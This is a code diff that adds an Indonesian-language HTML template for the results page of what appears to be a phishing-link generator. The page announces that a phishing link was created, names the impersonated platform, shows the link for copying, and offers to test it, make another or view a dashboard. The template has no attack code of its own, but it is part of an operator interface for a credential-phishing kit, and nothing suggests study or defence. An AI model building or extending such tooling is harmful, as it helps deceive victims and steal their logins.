@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Link Sukses</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    body {
+      background-color: #0e0e0e;
+      color: #00ff88;
+      font-family: 'Courier New', monospace;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    .box {
+      background-color: #1a1a1a;
+      border: 1px solid #00ffaa;
+      box-shadow: 0 0 20px #00ffaa55;
+      padding: 2rem;
+      border-radius: 10px;
+      max-width: 600px;
+      width: 100%;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      background: #000;
+      color: #00ff88;
+      padding: 0.8rem;
+      border: 1px solid #00ffaa;
+      font-family: monospace;
+      margin-bottom: 1rem;
+    }
+    a {
+      color: #00ffaa;
+      text-decoration: none;
+      display: block;
+      margin-top: 1rem;
+    }
+    a:hover {
+      color: #00ffcc;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>✅ Link Phishing Berhasil Dibuat!</h2>
+    <p><strong>Platform:</strong> {{ source }}</p>
+    <input type="text" value="{{ link }}" readonly onclick="this.select();">
+    <a href="{{ link }}" target="_blank">🌐 Uji Link Sekarang</a>
+    <a href="/create">🔁 Buat Link Baru</a>
+    <a href="/dashboard">📊 Lihat Dashboard</a>
+  </div>
+</body>
+</html>
